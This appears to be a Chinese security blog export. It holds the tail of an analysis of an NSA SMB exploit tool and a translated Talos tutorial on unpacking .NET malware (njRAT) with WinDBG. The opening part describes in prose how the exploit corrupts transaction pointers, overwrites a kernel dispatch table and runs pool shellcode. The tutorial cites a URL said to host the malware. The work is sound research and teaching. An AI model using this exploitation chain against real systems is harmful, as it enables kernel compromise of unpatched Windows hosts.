最后发送一个command为0x32的包，触发那个表中的函数调用 漏洞分析总结 本工具主要利用SrvSmbTransactionSecondary中的memmove从而覆盖另一个transaction的OutData指针和InData地址从而到达任意地址写和任意地址读的漏洞 也利用了nt rename，之后利用RestartTransactionResponse的memmove覆盖另一个OutData指针 通过改写SrvNtTransactionDispatchTable的0x70偏移达到执行任意代码的目的 还有一段小shellcode，去分配pool内存 之后泄露pool内存的地址 最后将真正的shellcode复制到那个内存，最后触发shellcode执行 分析smb漏洞的一些总结 nt trans request是用nt的函数来处理的，否则是不带nt的函数来处理（例子 SrvSmbNtTransactionSecondary和SrvSmbTransactionSecondary） nt trans request最后发送给客户端的时候是用SrvStartSend，不带nt的request使用的是SrvStartSend2 在64位系统的情况下 transaction的结构如下： 123456789101112131415161718192021struct transaction&#123; 0x70 ParametersIn 0x78 ParametersOut 0x80 InData 0x88 OutData 0xa0 Dataoffset //不是100%肯定 0xa4 DataCount 0xa8 DataDisplacement //不是100%肯定 0xba Tid 0xbc Pid 0xbe Uid 0xc0 OtherInfo 0xd0 指向第一次回应的smb全部数据 0xd8 可能指向第一次回应的smb的body部分，就只header之后 0xdc 可能是第一个回应包的DataCount（就是有Secondary的数据包的情况下） 0xf0 Secondaryd的COMMAND值&#125; 123SrvSmbTransactionSecondary的第一个参数偏移0xc0 当前request的所有数据0xc8 当前request的body部分 CONNECTION地址的0x78偏移处储存的是PreferredWorkQueue PreferredWorkQueue+0x198偏移处储存的是IrpThread IrpThread+0x220偏移储存的是KProcess KProcess+0x240偏移存储的是nt!KiProcessListHead（ProcessListEntry.Blink） Nt的基址在nt!KiProcessListHead前面，本工具从nt!KiProcessListHead-0x2cfc80开始寻找 怎么确认找到了Nt的基址呢？就凭两个字节，就是MZ头，😄 参考资料https://blogs.technet.microsoft.com/srd/2017/07/13/eternal-synergy-exploit-analysis/ http://blogs.360.cn/360safe/2017/04/19/eternalromance-analyze/","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"nsa工具","slug":"nsa工具","permalink":"https://www.giantbranch.cn/tags/nsa工具/"}]},{"title":"翻译——在windbg的帮助下解剖.NET","slug":"翻译——在windbg的帮助下解剖.NET","date":"2017-08-31T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2017/08/31/翻译——在windbg的帮助下解剖.NET/","link":"","permalink":"https://www.giantbranch.cn/2017/08/31/翻译——在windbg的帮助下解剖.NET/","excerpt":"","text":"[toc] .NET是Microsoft生态系统中重要的组成部分，为不同语言和硬件平台之间的互操作性提供了共享框架。 许多Microsoft工具（如PowerShell）和其他管理功能依赖于.NET平台的功能。 这使得.NET成为恶意软件开发人员的诱人语言。 因此，恶意软件研究人员还必须熟悉该语言，并具有分析在平台上运行的恶意软件的必要技能。 诸如ILSpy之类的分析工具有助于研究人员从应用程序中反编译代码，但不能用于自动分析许多样本。 在本文中，我们将介绍如何使用WinDBG来使用Microsoft提供的SOS扩展来分析.NET应用程序。 本文主要介绍：如何通过在.NET API中插入断点来分析PowerShell脚本。如何轻松创建一个脚本，以便在分析加壳的逻辑后自动解压缩.NET样本。 此外，您可以在我们的github上下载一个Python脚本（基于WinDBG pykd扩展），以自动分析.NET。 这个脚本也将在文章中描述。 SOS 扩展SOS Extension为WinDBG提供.NET支持。 扩展提供了丰富的命令集; 在本文中，我们将仅介绍一些对分析有用的内容。 首先，SOS扩展名不在同一个库中，这取决于你所使用的.NET的版本。 在我们能够使用SOS扩展之前，我们必须将库加载到WinDBG中。 对于.NET 4，扩展名位于CLR.dll中，可以加载以下命令： 1.loadby sos clr 而.NET 2 和 3的话： 1.loadby sos mscorwks 以下是本文中使用的命令：！bpmd：这个命令用于在.NET代码中设置断点。 该命令有两个参数。 第一个参数是函数所在的.NET dll，第二个是函数名。！CLRStack：此命令显示CLR堆栈内容。 识别.NET函数的参数很有用。！DumpObj：此命令显示有关参数中指定的特定对象的信息。 在本文中，这3个命令将用于在特定的.NET API中创建断点，以获取传递给API的参数，并显示内容。 案例1：POWERSHELL分析很少有人意识到PowerShell可以使用.NET框架。 通过检查.NET API使用情况，我们可以轻松自动化PowerShell分析。 示例1：启动过程API在本例中，我们将分析以下PowerShell代码： 1PS&gt; start-process notepad.exe 执行此任务时，PowerShell将调用Process.Start 这个API。 所以，我们可以在这个API设置之断点： 1234567890:011&gt; .loadby sos clr0:011&gt; !bpmd system.dll System.Diagnostics.Process.StartFound 6 methods in module 00007fff97581000...breakpoint: bp 00007FFF977C96D9 [System.Diagnostics.Process.Start(System.Diagnostics.ProcessStartInfo)]breakpoint: bp 00007FFF97E8057D [System.Diagnostics.Process.Start(System.String, System.String)]breakpoint: bp 00007FFF97E80539 [System.Diagnostics.Process.Start(System.String)]breakpoint: bp 00007FFF97E804B6 [System.Diagnostics.Process.Start(System.String, System.String, breakpoint: bp 00007FFF977C72DA [System.Diagnostics.Process.Start()]Adding pending breakpoints... 断点设置完成后，我们可以输入命令“g”来执行PowerShell脚本。 执行Start-Process时，WinDBG将会停止： 123Breakpoint 0 hitSystem_ni+0x2496d9:00007fff`977c96d9 488d0d08711e00 lea rcx,[System_ni+0x4307e8 (00007fff`979b07e8)] CLRStack命令会显示Process.Start API的参数。 在我们的例子中，参数是一个System.Diagnostics.ProcessStartInfo对象。 1234560:008&gt; !CLRStack -pOS Thread Id: 0x2d34 (8) Child SP IP Call Site000000a7f9ace700 00007fff977c96d9 System.Diagnostics.Process.Start(System.Diagnostics.ProcessStartInfo) PARAMETERS: startInfo (&lt;CLR reg&gt;) = 0x0000028cbd5faa18 最后，DumpObj命令显示此对象的内容： 12345678910111213140:008&gt; !DumpObj /d 0000028cbd5faa18Name: System.Diagnostics.ProcessStartInfoMethodTable: 00007fff979ae380EEClass: 00007fff975e29f0Size: 144(0x90) bytesFile: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\System.dllFields: MT Field Offset Type VT Attr Value Name00007fff9897de98 40027f3 8 System.String 0 instance 28cbd5fde18 fileName00007fff9897de98 40027f4 10 System.String 0 instance 000 arguments[...redacted...]00007fff9897ad70 4002806 58 System.WeakReference 0 instance 000 weakParentProces00007fff979af0a0 4002807 60 ....StringDictionary 0 instance 000 environmentVaria00007fff982e5ec0 4002808 68 ...tring, mscorlib]] 0 instance 000 environment ProcessStartInfo对象的第一个字段是filename，类型是System.String对象。 我们可以使用DumpObj检索对象的内容： 12345670:008&gt; !DumpObj /d 0000028cbd5fde18Name: System.StringMethodTable: 00007fff9897de98EEClass: 00007fff982d35f0Size: 88(0x58) bytesFile: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\mscorlib.dllString: C:\\WINDOWS\\system32\\notepad.exe 那我们就可以看到我们运行的程序的路径了 示例2：DownloadFile API代码如下： 12PS&gt; $a = New-Object System.Net.WebClientPS&gt; $a.DownloadFile(&quot;http://blog.talosintelligence.com/&quot;,&quot;c:\\users\\lucifer\\demo.txt&quot;) 此代码的目的是将文件下载并存储在硬盘驱动器上。 恶意软件经常使用这种技术来下载payload。 如果是这种情况，我们必须在DownloadFile API上放上断点，然后按’g’来执行PowerShelI： 1234567890:008&gt; .loadby sos clr0:008&gt; !bpmd system.dll System.Net.WebClient.DownloadFileFound 2 methods in module 00007fff97581000...MethodDesc = 00007fff976c1fe8MethodDesc = 00007fff976c1ff8Setting breakpoint: bp 00007FFF97DCAE0C [System.Net.WebClient.DownloadFile(System.Uri, System.String)]Setting breakpoint: bp 00007FFF97DCADBC [System.Net.WebClient.DownloadFile(System.String, System.String)]Adding pending breakpoints…0:008&gt; g 之后便会断下来 123Breakpoint 7 hitSystem_ni+0x84adbc:00007fff`97dcadbc 4885d2 test rdx,rdx 在这种情况下，我们可以像以前一样使用CLRStack和DumpObj命令。 还可以手动，我们直接从寄存器获取值（第一个字符串位于RDX + 0xC中，第二个字符串位于R8 + 0xC中）： 1234560:008&gt; du rdx+c0000028c`bd53f13c &quot;http://blog.talosintelligence.co&quot;0000028c`bd53f17c &quot;m/&quot;0:008&gt; du r8+c0000028c`bd53f3b4 &quot;c:\\users\\lucifer\\desktop\\demo.tx&quot;0000028c`bd53f3f4 &quot;t&quot; 截图如下： 译者注： 32位的话如下（05083c88是第三个参数，对应上面的r8储存第3个参数） 12345678910111213140:023&gt; du edx+805083a24 &quot;http://blog.talosintelligence.co&quot;05083a64 &quot;m/&quot;0:023&gt; dd esp09e8ebac 05095ef8 09e8ebe4 07f35dbb 05083c8809e8ebbc 04ab53b8 050724b0 00000000 0000000009e8ebcc 00000000 00000000 0509328c 05095ef809e8ebdc 05091d40 09e8ec30 09e8ec40 66a8e96b09e8ebec 05083c88 05083a1c 05073df4 0000000009e8ebfc 05095fbc 05095f40 050938b4 050b6bb409e8ec0c 05095f50 0509328c 05073df4 05095ef809e8ec1c 00000000 00000000 00000000 000000000:023&gt; du 05083c88+805083c90 &quot;c:\\users\\lucifer\\demo.txt&quot; 案例2: .NET UNPACKTalos每天处理包装恶意软件样本。 我们最近确定了一个包装的.NET可执行文件，它正在叙利亚政府网站上托管：http://www.syriantax.gov.sy/css/igfxCUIService.exe 最初我们想知道这是否是有针对性的攻击的一部分。 经过进一步的研究，我们现在认为，这个网站已被入侵，并被用来提供这种恶意软件。 恶意软件原来是njRAT，这是一个知名的远程管理工具，已经存在了很多年。 找到njRAT并不是特别有趣，我们认为写一个博客文章，看看njRAT的脱壳过程就相对有趣了。 因此，此用例将解释如何使用静态分析来处理未知的.NET包装程序。 我们还将介绍使用WinDBG的动态分析，以及如何创建一个WinDBG脚本，以自动化这种类型的打包程序的拆包过程。 静态分析我们通过使用de4dot来开始我们对恶意软件样本的分析，因为它可以快速识别已知的壳。 这是一个开源分析平台（吾爱破解工具包2.0就有） 123456789101112C:&gt; de4dot-x64.exe -d -r c:\\to_testde4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.comLatest version and source code: https://github.com/0xd4d/de4dotDetected Unknown Obfuscator (c:\\to_test\\21acd3457c1a58[...]1bfeeaf3c0cd79bfe)Detected Unknown Obfuscator (c:\\to_test\\344ce133363f09[...]bbd2257a298484051)Detected Unknown Obfuscator (c:\\to_test\\45c695e610d786[...]af65408fb6080300f)Detected Unknown Obfuscator (c:\\to_test\\61653b2811fb7c[...]04f9807a775f25773)Detected Unknown Obfuscator (c:\\to_test\\ac7bd77245bdf2[...]aee4d06563f057ca6)Detected Unknown Obfuscator (c:\\to_test\\b607e87acdcb2e[...]d30eddddffbeec320)Detected Unknown Obfuscator (c:\\to_test\\e93c0aed6bbb4a[...]6c2efe65942f83504) 在本节中，我们还将使用ILSpy———开源.NET反编译器。 XOR 变种样本SHA-256：45c695e610d78178ec5ca6f4e1993afacf4e435b566cd2caf65408fb6080300f 入口点是ob6eaGgG7Bht6B35c0.G9puOotvCiNCkEEPD9.XHh0nc9pu，我们可以使用ILSpy获得此信息： 首先，程序解码一个Base64编码的字符串（变量G9puOotvCiNCkEEPD9.EHQI8XHAH）。 该解码的字符串将传递给函数G9puOotvCiNCkEEPD9.vovYCiNCk的第二个参数，最终作为XOR（异或） 的key： 通过向下看，我们可以通过查看ILSpy的反编译结果看到异或操作，就是这个符号”^”，我们可以确定这是XOR(异或)操作。 最后，函数的输出作为参数传递给函数Assembly.Load。 此函数用于加载.NET二进制文件。 AES 变种样本SHA-256：21acd3457c1a589e117988fe0456e50ed627f051a97ccd11bfeeaf3c0cd79bfe 这个变种中包含的逻辑是相同的，但不是使用XOR混淆，而是使用AES加密（也称为Rijndael）：（译者注：可以看到下面用到了RijndaelManaged类） 最后，使用Assembly.Load函数将解密的数据加载到内存中。 共同点虽然每个分析的样本使用的算法是不同的，但编码与加密的逻辑是完全相同的。 如果我们可以导出在Assembly.Load函数的参数中找到的字节数组变量，那么我们就可以获得脱壳了的恶意软件（译者注：因为调用Assembly.Load的时候，传递给该函数的参数就是解密后了程序数据）。 用windbg动态调试先看 .NET 4为了动态分析 .NET 4样本，我们需要获得WinDBG SOS扩展。 此扩展允许使用Microsoft Debugger进行 .NET 4调试。(译者注：这个SOS.dll就在 .NET目录啊) 让我们执行恶意软件吧… 第一步是在加载CLRJIT库时停下来： 123456789100:000&gt; sxe ld clrjit0:000&gt; g(dc0.1594): Unknown exception - code 04242420 (first chance)ModLoad: 70fc0000 71040000 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\clrjit.dlleax=00000000 ebx=00800000 ecx=00000000 edx=00000000 esi=00000000 edi=0044e000eip=7736e85c esp=006fe4fc ebp=006fe558 iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000206ntdll!NtMapViewOfSection+0xc:7736e85c c22800 ret 28h 然后，我们加载WinDBG SOS扩展以对.NET应用程序进行分析：（译者注：不应该是这个么：.loadby sos clr） 10:000&gt; .load &quot;C:\\\\Psscor4\\\\x86\\\\x86\\\\psscor4.dll&quot; 我们现在有了与.NET调试相关的新的WinDBG命令。 我们可以基于.NET API使用设置断点。 在这种情况下，我们对Assembly.Load API感兴趣： 123456789101112131415161718190:000&gt; !bpmd mscorlib.dll System.Reflection.Assembly.LoadFound 8 methods in module 71041000...MethodDesc = 71100b50MethodDesc = 71100b7cMethodDesc = 71100b88MethodDesc = 71100b94MethodDesc = 71100bb8MethodDesc = 71100bd0MethodDesc = 71100bdcMethodDesc = 71100be8Setting breakpoint: bp 71B29095 [System.Reflection.Assembly.Load(Byte[], Byte[], System.Security.Policy.Evidence)]Setting breakpoint: bp 71B29037 [System.Reflection.Assembly.Load(Byte[], Byte[], System.Security.SecurityContextSource)]Setting breakpoint: bp 71B28FFF [System.Reflection.Assembly.Load(Byte[], Byte[])]Setting breakpoint: bp 71B28F9C [System.Reflection.Assembly.Load(Byte[])]Setting breakpoint: bp 71395949 [System.Reflection.Assembly.Load(System.Reflection.AssemblyName, System.Security.Policy.Evidence)]Setting breakpoint: bp 713F3479 [System.Reflection.Assembly.Load(System.Reflection.AssemblyName)]Setting breakpoint: bp 71B28F3D [System.Reflection.Assembly.Load(System.String, System.Security.Policy.Evidence)]Setting breakpoint: bp 713C880D [System.Reflection.Assembly.Load(System.String)]Adding pending breakpoints... （目前在扩展中有一个bug，需要执行两次命令） 当执行Assembly.Load函数时，调试器就暂停下来了： 1234567890:000&gt; gBreakpoint 3 hiteax=00000000 ebx=006ff2dc ecx=026b30b8 edx=0000000a esi=026b30b8 edi=006ff250eip=71b28f9c esp=006ff210 ebp=006ff218 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246mscorlib_ni+0xae8f9c:71b28f9c e80368fdff call mscorlib_ni+0xabf7a4 (71aff7a4) 显然，我们可以使用CLRStack和DumpObj命令来完全获得前面用例中提到的参数。 在这个例子中，我们只会使用寄存器的内容——传递给Assembly.Load的参数可以通过esp寄存器找到： 123456789100:000&gt; dp esp006ff210 00000000 026b30b8 006ff238 009504ae006ff220 00000000 00000000 00000000 00000000006ff230 00000000 00000000 006ff244 7240ea56006ff240 00a149a8 006ff298 724293ef 006ff2dc006ff250 006ff288 725b24b0 006ff3b0 724293a8006ff260 ecebc740 006ff404 006ff370 006ff324006ff270 7246e611 006ff2dc 00000000 ecebc740006ff280 006ff250 006ff370 006ff424 725b0890 栈中的第二个值是指向字节数组的指针：0x026b30b8。 12345670:000&gt; dp 026b30b8 026b30b8 71504448 00005e00 00905a4d 00000003026b30c8 00000004 0000ffff 000000b8 000000000:000&gt; db 026b30b8+8 L16026b30c0 4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00 MZ..............026b30d0 b8 00 00 00 00 00 ...... 第二个参数0x5e00是字节数组的大小，之后我们可以看到以MZ：0x4d 0x5a开头的PE文件的文件头。 我们现在可以直接从WinDBG中转储被加密代码解密完成的样本： 1.writemem C:\\\\unpacked_sample.exe 026b30b8+8 L00005e00 再看 .NET 2 、3使用.NET版本2和3编译的恶意软件的动态分析过程是一样的。 不同的是参数如何传递给Assembly.Load API。 在这种情况下，参数不使用堆栈，而是存储在ECX寄存器中： 12345670:000&gt; dp ecx024ba0b8 71504448 00005e00 00905a4d 00000003024ba0c8 00000004 0000ffff 000000b8 000000000:000&gt; db ecx+8 L16024ba0c0 4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00 MZ..............024ba0d0 b8 00 00 00 00 00 自动脱壳得益于上述分析，我们可以创建一个通用的脱壳器。 您可以在附录2中找到.NET版本2,3和4的WinDBG脚本。 可以使用以下语法调用此脚本： 1&quot;c:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe&quot; -c &quot;$$&gt;a&lt; C:\\unpack.script C:\\unpacked_sample.exe&quot; &quot;c:\\sample.exe&quot; 以下是脚本执行的截图： python 脚本您可以从我们的github中下载一个python脚本来自动化的.NET分析。 该脚本需要pykd扩展才能在WinDBG中执行python。 该脚本使用本文前面提到的SOS命令，目的是获得更好的输出。 配置位于脚本的开头： bp_list变量包含断点列表。 在该示例中，该脚本将在3个 .NET API（System.Diagnotics.Process.Start，System.Net.WebClient.Download.File和Sysyem.Reflection.Assembly.Load）上下断点。 3个函数的参数将显示在WinDBG中。 如果dump_byte_array变量设置为1，脚本将自动转储分析函数（其中有断点的位置）的参数中提供的字节数组。 转储将位于dump_byte_array_path目录中。 该脚本允许文本或json输出。 本文中的示例输出文本，但我们可以通过将JsonDebug变量设置为“True”来切换json。 示例1下面是当调用Assembly.Load函数时脚本的输出： 123456789101112131415161718192021222324252627280:000&gt; .loadby sos clr0:000&gt; .load pykd.dll0:000&gt; !py C:\\Users\\lucifer\\NET_plugin.py[.NET plugin] Beginning, setting breakpoints...[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0xb4fa65[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0xb4fa07[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0xb4f9cf[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0xb4f96c[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0x38a5a1[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0x3bda7d[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0xb4f90d[.NET plugin] breakpoint: mscorlib.dll System.Reflection.Assembly.Load mscorlib_ni+0x3968dd[.NET plugin] Let&apos;s go...[.NET plugin] Breakpoint: System.Reflection.Assembly.Load(Byte[])[.NET plugin] Argument 0: rawAssembly[.NET plugin] !DumpObj /d 0x02f67e04 Name: System.Byte[] MethodTable: 6b5f60f8 EEClass: 6b190878 Size: 5644(0x160c) bytes Array: Rank 1, Number of elements 5632, Type Byte (Print Array) Content: MZ......................@...............................................!..L.!This program cannot Fields: None [.NET plugin] let&apos;s dump 0x02f67e04+8 Size:5644 .writemem c:\\users\\lucifer\\Desktop\\dump_1496942775_0x02f67e04_5644.dmp 0x02f67e04+8 L5644 Assembly.Load参数中的字节数组的内容将自动存储在c:\\users\\lucifer\\Desktop\\dump_1496942775_0x02f67e04_5644.dmp 示例2以下是执行start-process的PowerShell脚本上的脚本输出： 12345678910111213141516171819202122232425262728293031323334353637383940[.NET plugin] Breakpoint: System.Diagnostics.Process.Start(System.Diagnostics.ProcessStartInfo)[.NET plugin] Argument 0: startInfo[.NET plugin] !DumpObj /d 0x000001ad173cdb68 Name: System.Diagnostics.ProcessStartInfo MethodTable: 00007ffd7e3ee798 EEClass: 00007ffd7e0229f0 Size: 144(0x90) bytes File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\System.dll Fields: MT Field Offset Type VT Attr Value Name 07ffd69e969d0 40027fa 8 System.String 0 instance 01ad173d0f20 fileName 07ffd69e969d0 40027fb 10 System.String 0 instance 00000000000 arguments 07ffd69e969d0 40027fc 18 System.String 0 instance 1ad173d4bf8 directory 07ffd69e969d0 40027fd 20 System.String 0 instance 000000000000 verb 07ffd7e3c2a50 40027fe 78 System.Int32 1 instance 0 windowStyle 07ffd69ea1fb0 40027ff 7c System.Boolean 1 instance 0 errorDialog 07ffd69eafc48 4002800 70 System.IntPtr 1 instance 0 errorDialogPare 07ffd69ea1fb0 4002801 7d System.Boolean 1 instance 1 useShellExecut 07ffd69e969d0 4002802 28 System.String 0 instance 000000000000 userName 07ffd69e969d0 4002803 30 System.String 0 instance 000000000000 domain 07ffd69ea4068 4002804 38 ...rity.SecureString 0 instance 00000000 password 07ffd69e969d0 4002805 40 System.String 0 instance 0 passwordInClearText 07ffd69ea1fb0 4002806 7e System.Boolean 1 instance, 1 loadUserProfile 07ffd69ea1fb0 4002807 7f System.Boolean 1 instance 0 redirectStandar 07ffd69ea1fb0 4002808 80 System.Boolean 1 instance 0 redirectStandard 07ffd69ea1fb0 4002809 81 System.Boolean 1 instance 0 redirectStandard 07ffd69e9b048 400280a 48 System.Text.Encoding 0 instance 0 standardOutp 07ffd69e9b048 400280b 50 System.Text.Encoding 0 instance 0 standardErro 07ffd69ea1fb0 400280c 82 System.Boolean 1 instance 0 createNoWindow 07ffd69eadec8 400280d 58 System.WeakReference 0 instance 0000 weakParentPr 07ffd7e3ef4b8 400280e 60 ....StringDictionary 0 instance 0000 envVariables 07ffd697a69f0 400280f 68 ...tring, mscorlib]] 0 instance 0000 environment [.NET plugin] !DumpObj /d 000001ad173d0f20 Name: System.String MethodTable: 00007ffd69e969d0 EEClass: 00007ffd697950e0 Size: 82(0x52) bytes File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\mscorlib.dll String: C:\\WINDOWS\\system32\\calc.exe 该脚本显示有趣字段的参数和内容（在该示例中为fileName字符串）。（译者注：可以看到C:\\WINDOWS\\system32\\calc.exe） 示例3以下是在Powershell中使用DownloadFile API时脚本的输出： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[.NET plugin] Breakpoint: System.Net.WebClient.DownloadFile(System.Uri, System.String)[.NET plugin] Argument 1: address[.NET plugin] !DumpObj /d 0x000001ad17315e78 Name: System.Uri MethodTable: 00007ffd7e3f4cf0 EEClass: 00007ffd7dfc5fd0 Size: 72(0x48) bytes File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\System.dll Fields: MT Field Offset Type VT Attr Value Name 07ffd69e969d0 400040b 8 System.String 0 instance 000001ad172c5ea8 m_String 07ffd69e969d0 400040c 10 System.String 0 instance 000000000 m_originalUnico 07ffd7e3f51d8 400040d 18 System.UriParser 0 instance 001ad17032b40 m_Syntax 07ffd69e969d0 400040e 20 System.String 0 instance 00000000000 m_DnsSafeHost 07ffd7e3c2788 400040f 30 System.UInt64 1 instance 37615763456 m_Flags 07ffd7e3f5590 4000410 28 System.Uri+UriInfo 0 instance 01ad17315f00 m_Info 07ffd69ea1fb0 4000411 38 System.Boolean 1 instance 0 m_iriParsing 07ffd69e969d0 40003fb 220 System.String 0 shared static UriSchemeFile 07ffd69e969d0 40003fc 228 System.String 0 shared static UriSchemeFtp 07ffd69e969d0 40003fd 230 System.String 0 shared static UriSchemeGoph 07ffd69e969d0 40003fe 238 System.String 0 shared static UriSchemeHttp 07ffd69e969d0 40003ff 240 System.String 0 shared static UriSchemeHttps 07ffd69e969d0 4000400 248 System.String 0 shared static UriSchemeWs 07ffd69e969d0 4000401 250 System.String 0 shared static UriSchemeWss 07ffd69e969d0 4000402 258 System.String 0 shared static UriSchemeMail 07ffd69e969d0 4000403 260 System.String 0 shared static UriSchemeNews 07ffd69e969d0 4000404 268 System.String 0 shared static UriSchemeNntp 07ffd69e969d0 4000405 270 System.String 0 shared static UriSchemeNet 07ffd69e969d0 4000406 278 System.String 0 shared static UriSchemeNetP 07ffd69e969d0 4000407 280 System.String 0 shared static SchemeDelimit 07ffd7e3b4bd0 4000412 288 ...etSecurityManager 0 static s_ManagerRef 07ffd69e96fb0 4000413 290 System.Object 0 shared static s_IntranetLock 07ffd69ea1fb0 4000414 9c4 System.Boolean 1 shared static s_ConfigInitia 07ffd69ea1fb0 4000415 9c5 System.Boolean 1 shared static s_ConfigInitia 07ffd7e3afef8 4000416 9c0 System.Int32 1 shared static s_IdnScope 07ffd69ea1fb0 4000417 9c6 System.Boolean 1 shared static s_IriParsing 07ffd69e96fb0 4000418 298 System.Object 0 shared static s_initLock 07ffd69e97b20 400041c 2a0 System.Char[] 0 shared static HexLowerChars 07ffd69e97b20 400041d 2a8 System.Char[] 0 shared static _WSchars [.NET plugin] !DumpObj /d 000001ad172c5ea8 Name: System.String MethodTable: 00007ffd69e969d0 EEClass: 00007ffd697950e0 Size: 94(0x5e) bytes File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\mscorlib.dll String: http://blog.talosintelligence.com/ Fields: MT Field Offset Type VT Attr Value Name 07ffd69e99310 400026f 8 System.Int32 1 instance 34 m_stringLength 07ffd69e97b88 400027 c System.Char 1 instance 68 m_firstChar 07ffd69e969d0 4000274 90 System.String 0 shared static Empty[.NET plugin] Argument 2: fileName[.NET plugin] !DumpObj /d 0x000001ad172c61c8 Name: System.String MethodTable: 00007ffd69e969d0 EEClass: 00007ffd697950e0 Size: 92(0x5c) bytes File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_64\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\mscorlib.dll String: c:\\users\\lucifer\\desktop\\demo.txt Fields: MT Field Offset Type VT Attr Value Name 07ffd69e99310 400026f 8 System.Int32 1 instance 33 m_stringLength 07ffd69e97b88 4000270 c System.Char 1 instance 63 m_firstChar 07ffd69e969d0 4000274 90 System.String 0 shared static Empty 第一个参数是System.URI对象。 对象自动解析，相关内容显示在WinDBG中。 在这种情况下，显示第一个字段（字符串m_string）。 此字符串包含URL。 第二个参数是也显示的字符串（译者注：下载到的位置）。 示例4这是JSON启用的输出： 123456789101112131415161718192021222324252627282930313233343536373839404142434445460:020&gt; .loadby sos clr0:020&gt; .load pykd0:020&gt; !py c:\\Users\\lucifer\\DotNETPlugin.py&#123; &quot;date&quot;: 1500306926, &quot;bp&quot;: &quot;System.Diagnostics.Process.Start(System.Diagnostics.ProcessStartInfo)&quot;, &quot;arguments&quot;: &#123; &quot;0&quot;: &#123; &quot;fields&quot;: &#123; &quot;0&quot;: &#123; &quot;Type&quot;: &quot;System.String&quot;, &quot;Name&quot;: &quot;fileName&quot;, &quot;string&quot;: &quot;C:\\\\WINDOWS\\\\system32\\\\calc.exe&quot; &#125;, &quot;1&quot;: &#123; &quot;Type&quot;: &quot;System.String&quot;, &quot;Name&quot;: &quot;arguments&quot;, &quot;string&quot;: &quot;&quot; &#125;, &quot;2&quot;: &#123; &quot;Type&quot;: &quot;System.String&quot;, &quot;Name&quot;: &quot;directory&quot;, &quot;string&quot;: &quot;C:\\\\Users\\\\lucifer&quot; &#125;, &quot;3&quot;: &#123; &quot;Type&quot;: &quot;System.String&quot;, &quot;Name&quot;: &quot;verb&quot;, &quot;string&quot;: &quot;&quot; &#125;, [...redacted...] &quot;20&quot;: &#123; &quot;Type&quot;: &quot;....StringDictionary&quot;, &quot;Name&quot;: &quot;environmentVariables&quot;, &quot;value&quot;: &quot;0000000000000000&quot; &#125;, &quot;21&quot;: &#123; &quot;Type&quot;: &quot;...tring,&quot;, &quot;Name&quot;: &quot;environment&quot;, &quot;value&quot;: &quot;instance&quot; &#125; &#125;, &quot;name&quot;: &quot;startInfo&quot;, &quot;offset&quot;: &quot;0x0000025c1c572170&quot; &#125; &#125;&#125; 总结WinDBG是由Microsoft提供的一个非常强大的工具。 如果不熟悉windbg的语法和界面意味你将忽略这么一个这么好的恶意软件分析工具。 有了正确的扩展，它可以很容易地用于分析.NET等类似代码。 我们希望这篇文章引导您的好奇心，并且您将在下一次分析.NET等类是代码时考虑WinDBG。 附录加壳样本 SHA256 21acd3457c1a589e117988fe0456e50ed627f051a97ccd11bfeeaf3c0cd79bfe 344ce133363f005346210611d5abd2513934a32739bc6e1bbd2257a298484051 45c695e610d78178ec5ca6f4e1993afacf4e435b566cd2caf65408fb6080300f 61653b2811fb7c672584d00417cbc1a56c8372331f1913104f9807a775f25773 ac7bd77245bdf284d36ce1f9e2cb6a21d2dbd38aa1964dbaee4d06563f057ca6 b607e87acdcb2ef0f102298decc57ca3ea20fabbf02375fd30eddddffbeec320 e93c0aed6bbb4af734403e02d399c124f2d07f8e701fb716c2efe65942f83504 脱壳样本 SHA256 35dee9106e4521e5adf295cc945355d72eb359d610230142e5dd4adda9678dee b5ce02ee3dfccf28e86f737a6dde85e9d30ff0549ec611d115a1d575b5291c2e d9a732dcf87764a87f17c95466f557fac33f041ac6f244dba006ba155d8e9aea fe068ce56b258762c10cc66525c309e79026c0e44103ca9b223c51382722cb09 WinDBG 脚本.NET4之前 12345678910111213141516sxe ld mscorjitg.loadby sos mscorwks!bpmd mscorlib.dll System.Reflection.Assembly.Load.echo &quot;Weird bug... bp twice...&quot;!bpmd mscorlib.dll System.Reflection.Assembly.Loadgr $t1 = ecx.printf &quot;Byte array: &quot;;r $t1r $t2 = poi($t1+4).printf &quot;Size: &quot;;r $t2db $t1+8 L$t2.echo &quot;dump in the file: $&#123;$arg1&#125;&quot;.writemem $&#123;$arg1&#125; 